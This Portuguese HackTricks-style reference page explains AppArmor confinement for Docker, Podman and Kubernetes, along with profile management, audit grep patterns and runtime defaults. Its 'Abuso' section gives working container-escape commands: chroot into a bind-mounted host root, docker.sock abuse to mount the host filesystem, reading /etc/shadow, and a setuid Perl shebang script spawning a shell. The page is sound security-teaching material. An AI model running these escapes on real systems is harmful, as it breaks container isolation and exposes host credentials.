# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

AppArmor é um sistema de **Controle de Acesso Obrigatório** que aplica restrições por meio de perfis específicos para cada programa. Ao contrário das verificações tradicionais de DAC, que dependem muito da propriedade de usuários e grupos, o AppArmor permite que o kernel imponha uma política associada ao próprio processo. Em ambientes de containers, isso é importante porque uma carga de trabalho pode ter privilégios tradicionais suficientes para tentar uma ação e, ainda assim, ser impedida porque seu perfil do AppArmor não permite o caminho, o comportamento de montagem, o comportamento de rede ou o uso de capabilities em questão.

O conceito mais importante é que o AppArmor é **baseado em caminhos**. Ele avalia o acesso ao sistema de arquivos usando regras de caminho, em vez de rótulos, como faz o SELinux. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts de caminhos alternativos exigem atenção. Se o mesmo conteúdo do host ficar acessível por um caminho diferente, o efeito da política pode não ser o que o operador esperava inicialmente.

## Papel no isolamento de containers

As revisões de segurança de containers muitas vezes se limitam a capabilities e seccomp, mas o AppArmor continua sendo importante depois dessas verificações. Imagine um container com mais privilégios do que deveria ou uma carga de trabalho que precisou de uma capability adicional por motivos operacionais. O AppArmor ainda pode restringir o acesso a arquivos, o comportamento de montagem, a rede e os padrões de execução, impedindo os caminhos óbvios de abuso. Por isso, desativar o AppArmor "só para fazer a aplicação funcionar" pode transformar silenciosamente uma configuração apenas arriscada em uma que é ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Para verificar em qual contexto o processo atual do contêiner está sendo executado:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

A diferença é instrutiva. No caso normal, o processo deve apresentar um contexto do AppArmor associado ao perfil escolhido pelo runtime. No caso sem confinamento, essa camada extra de restrição desaparece.

Você também pode inspecionar o que o Docker acredita ter aplicado:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Uso em tempo de execução

O Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host oferece suporte. O Podman também pode integrar-se ao AppArmor em sistemas baseados em AppArmor, embora, em distribuições que priorizam SELinux, o outro sistema MAC frequentemente tenha mais destaque. O Kubernetes pode disponibilizar políticas AppArmor no nível da carga de trabalho em nós que realmente oferecem suporte ao AppArmor. O LXC e outros ambientes de contêineres de sistema da família Ubuntu também usam AppArmor extensivamente.

Na prática, o AppArmor não é um "recurso do Docker". É um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não oferecer suporte ou o runtime for configurado para executar sem restrições, a suposta proteção não estará realmente presente.

Especificamente para o Kubernetes, a API moderna é `securityContext.appArmorProfile`. Desde o Kubernetes `v1.30`, as antigas anotações beta do AppArmor estão obsoletas. Em hosts compatíveis, `RuntimeDefault` é o perfil padrão, enquanto `Localhost` aponta para um perfil que já precisa estar carregado no nó. Isso importa durante uma revisão porque um manifesto pode parecer compatível com AppArmor e ainda depender inteiramente do suporte do nó e de perfis pré-carregados.<sup>[[1]](#references)</sup>

Um detalhe operacional sutil, mas útil, é que definir explicitamente `appArmorProfile.type: RuntimeDefault` é mais rigoroso do que simplesmente omitir o campo. Se o campo for definido explicitamente e o nó não oferecer suporte ao AppArmor, a admissão deverá falhar. Se o campo for omitido, a carga de trabalho ainda poderá ser executada em um nó sem AppArmor, mas sem essa camada extra de confinamento. Do ponto de vista de um atacante, esse é um bom motivo para verificar tanto o manifesto quanto o estado real do nó.<sup>[[1]](#references)</sup>

Em hosts compatíveis com Docker e AppArmor, o perfil padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que algumas PoCs baseadas em capabilities ainda falham em um contêiner padrão. Em termos gerais, `docker-default` permite o uso comum da rede, nega gravações em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount e restringe o ptrace para que não seja um recurso geral de sondagem do host. Entender essa configuração básica ajuda a distinguir entre "o contêiner tem `CAP_SYS_ADMIN`" e "o contêiner pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de perfis

Os perfis AppArmor geralmente ficam armazenados em `/etc/apparmor.d/`. Uma convenção comum de nomenclatura é substituir as barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` geralmente é armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe importa tanto na defesa quanto na avaliação, pois, quando você sabe o nome do perfil ativo, muitas vezes pode localizar rapidamente o arquivo correspondente no host.

Comandos úteis de gerenciamento no host incluem:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

O motivo pelo qual esses comandos são importantes em uma referência sobre segurança de containers é que eles explicam como os perfis são criados, carregados, colocados em modo complain e modificados após alterações na aplicação. Se um operador tem o hábito de colocar perfis em modo complain durante a resolução de problemas e se esquece de restaurar a aplicação das regras, o container pode parecer protegido na documentação, embora, na prática, se comporte de forma muito mais permissiva.

### Criar e atualizar perfis

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um perfil interativamente:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` pode gerar um perfil de modelo que pode ser carregado posteriormente com `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Quando o binário muda e a política precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permiti-las ou negá-las:

```bash
sudo aa-logprof
```

### Logs

As negações do AppArmor geralmente são visíveis pelo `auditd`, syslog ou por ferramentas como `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Isso é útil operacionalmente e ofensivamente. Defensores usam isso para refinar profiles. Atacantes usam isso para descobrir qual caminho ou operação exata está sendo negada e se o AppArmor é o controle que está bloqueando uma exploit chain.

### Identificando o Arquivo Exato do Profile

Quando um runtime mostra um nome específico de profile AppArmor para um container, muitas vezes é útil associar esse nome ao arquivo do profile no disco:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Isso é especialmente útil durante uma análise no host, pois faz a ponte entre “o container diz que está sendo executado sob o perfil `lowpriv`” e “as regras reais estão neste arquivo específico, que pode ser auditado ou recarregado”.

### Regras de alto impacto para auditar

Quando puder ler um perfil, não se limite a linhas `deny` simples. Vários tipos de regra alteram significativamente a eficácia do AppArmor contra uma tentativa de escape de container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: executa o binário de destino sem confinamento. Se um helper, shell ou interpretador acessível for permitido por `ux`, esse geralmente é o primeiro ponto a testar.
- `px` / `Px` e `cx` / `Cx`: realizam transições de perfil na execução. Não são automaticamente ruins, mas vale a pena auditá-los, pois a transição pode levar a um perfil muito mais permissivo que o atual.
- `change_profile`: permite que uma tarefa mude para outro perfil carregado, imediatamente ou na próxima execução. Se o perfil de destino for mais fraco, isso pode se tornar a rota de escape prevista para sair de um domínio restritivo.
- `flags=(complain)`, `flags=(unconfined)` ou o mais recente `flags=(prompt)`: devem influenciar o nível de confiança que você deposita no perfil. `complain` registra as negações em vez de aplicá-las, `unconfined` remove a barreira, e `prompt` depende de uma decisão em userspace, em vez de uma negação aplicada exclusivamente pelo kernel.
- `userns` ou `userns create,`: políticas mais recentes do AppArmor podem mediar a criação de user namespaces. Se um perfil de container permitir isso explicitamente, user namespaces aninhados continuam sendo uma possibilidade, mesmo quando a plataforma usa AppArmor como parte da estratégia de hardening.

Comando grep útil no host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Esse tipo de auditoria costuma ser mais útil do que ficar olhando centenas de regras comuns de arquivos. Se um breakout depende da execução de um helper, da entrada em um novo namespace ou da fuga para um profile menos restritivo, a resposta costuma estar oculta nessas regras orientadas a transições, e não nas linhas óbvias no estilo `deny /etc/shadow r`.

## Configurações incorretas

O erro mais óbvio é `apparmor=unconfined`. Administradores costumam defini-lo ao depurar um aplicativo que falhou porque o profile bloqueou corretamente algo perigoso ou inesperado. Se a flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é presumir que bind mounts são inofensivos porque as permissões dos arquivos parecem normais. Como o AppArmor é baseado em caminhos, expor caminhos do host em locais alternativos de montagem pode interagir mal com as regras de caminhos. Um terceiro erro é esquecer que um nome de profile em um arquivo de configuração significa muito pouco se o kernel do host não estiver realmente aplicando o AppArmor.

## Abuso

Quando o AppArmor não está ativo, operações que antes eram restringidas podem funcionar de repente: leitura de caminhos sensíveis por meio de bind mounts, acesso a partes do procfs ou sysfs que deveriam ser mais difíceis de usar, execução de ações relacionadas a mounts se as capabilities/seccomp também permitirem, ou uso de caminhos que um profile normalmente negaria. O AppArmor costuma ser o mecanismo que explica por que uma tentativa de breakout baseada em capabilities, que "deveria funcionar" no papel, ainda falha na prática. Remova o AppArmor, e a mesma tentativa pode começar a funcionar.

Se você suspeita que o AppArmor é o principal mecanismo que está impedindo uma cadeia de abuso baseada em path-traversal, bind-mount ou mount, o primeiro passo geralmente é comparar o que fica acessível com e sem um profile. Por exemplo, se um caminho do host estiver montado dentro do container, comece verificando se você consegue percorrê-lo e lê-lo:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Se o container também tiver uma capability perigosa, como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que bloqueia operações de mount ou o acesso a filesystems sensíveis do kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Em ambientes nos quais um caminho do host já está disponível por meio de um bind mount, perder o AppArmor também pode transformar um problema de divulgação de informações somente leitura em acesso direto a arquivos do host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

O objetivo desses comandos não é que o AppArmor, por si só, cause o breakout. O ponto é que, assim que o AppArmor é removido, muitos caminhos de abuso baseados no sistema de arquivos e em montagens podem ser testados imediatamente.

### Exemplo completo: AppArmor desativado + root do host montado

Se a raiz do host já estiver montada por bind em `/host` no contêiner, remover o AppArmor pode transformar um caminho de abuso do sistema de arquivos que estava bloqueado em uma fuga completa do host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Quando o shell passa a executar por meio do sistema de arquivos do host, a carga de trabalho efetivamente escapou dos limites do contêiner:

```bash
id
hostname
cat /etc/shadow | head
```

### Exemplo completo: AppArmor desativado + socket de runtime

Se a barreira real era o AppArmor em torno do estado do runtime, um socket montado pode ser suficiente para escapar completamente:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: o AppArmor deixa de impedir o acesso à API do runtime, e a API do runtime pode iniciar um container capaz de comprometer o host.

### Exemplo completo: bypass de bind-mount baseado em caminho

Como o AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo do procfs do host quando ele pode ser acessado por outro caminho:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

O impacto depende exatamente do que está montado e de o caminho alternativo também contornar outros controles, mas esse padrão é um dos motivos mais claros pelos quais o AppArmor deve ser avaliado em conjunto com a configuração de montagem, e não isoladamente.

### Exemplo completo: Shebang Bypass

O AppArmor pode associar um perfil ao caminho do script executado, em vez de ao interpretador indicado pelo shebang. Por outro lado, invocar diretamente o interpretador pode selecionar o perfil dele. Um [mantenedor do AppArmor descreve essa distinção](https://bugs.launchpad.net/apparmor/+bug/1911431). Um exemplo histórico envolvia um script cuja primeira linha aponta para um interpretador confinado:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

O exemplo é apenas um candidato em que a capacidade de arquivo do interpretador pode se tornar efetiva e o anexo `exec` real do script permite a operação. Verifique a política carregada e o rótulo do processo, o conjunto de capacidades permitidas, `no_new_privs` e o estado `nosuid` da montagem; apenas o nome de um arquivo de perfil ou uma listagem `cap_setuid+ep` não comprova que a transição seja utilizável. Cadeias de interpretadores e caminhos alternativos de execução devem ser analisados separadamente.

## Verificações

O objetivo destas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado e o runtime realmente aplicou um perfil a este container?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

O que é interessante aqui:

- Se `/proc/self/attr/current` mostrar `unconfined`, o workload não está se beneficiando do confinamento do AppArmor.
- Se `aa-status` mostrar que o AppArmor está desabilitado ou não foi carregado, qualquer nome de profile na configuração do runtime é, em grande parte, cosmético.
- Se `docker inspect` mostrar `unconfined` ou um profile customizado inesperado, essa costuma ser a razão pela qual um caminho de abuso baseado em filesystem ou mount funciona.
- Se `/sys/kernel/security/apparmor/profiles` não contiver o profile esperado, a configuração do runtime ou do orquestrador, por si só, não é suficiente.
- Se um profile supostamente reforçado contiver regras no estilo `ux`, `change_profile` amplo, `userns` ou `flags=(complain)`, o limite prático pode ser muito mais fraco do que o nome do profile sugere.

Se um container já tiver privilégios elevados por motivos operacionais, manter o AppArmor habilitado costuma fazer a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Padrões de Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão em hosts com suporte a AppArmor | Usa o profile AppArmor `docker-default`, a menos que seja substituído | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende do host | O AppArmor é compatível por meio de `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal do que o profile `docker-default` documentado pelo Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão será `RuntimeDefault`, mas ele só será aplicado quando o AppArmor estiver habilitado no node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um profile fraco, nodes sem suporte a AppArmor |
| containerd / CRI-O sob Kubernetes | Depende do suporte do node/runtime | Runtimes com suporte comum no Kubernetes são compatíveis com AppArmor, mas a aplicação efetiva ainda depende do suporte do node e das configurações do workload | Igual à linha do Kubernetes; a configuração direta do runtime também pode ignorar completamente o AppArmor |

Para o AppArmor, a variável mais importante costuma ser o **host**, não apenas o runtime. Uma configuração de profile em um manifesto não cria confinamento em um node onde o AppArmor não está habilitado.

## References

- [1] [Contexto de segurança do Kubernetes: campos de profile do AppArmor e comportamento do suporte do node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Página de manual `apparmor.d(5)` do Ubuntu 24.04: transições de execução, `change_profile`, `userns` e flags de profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
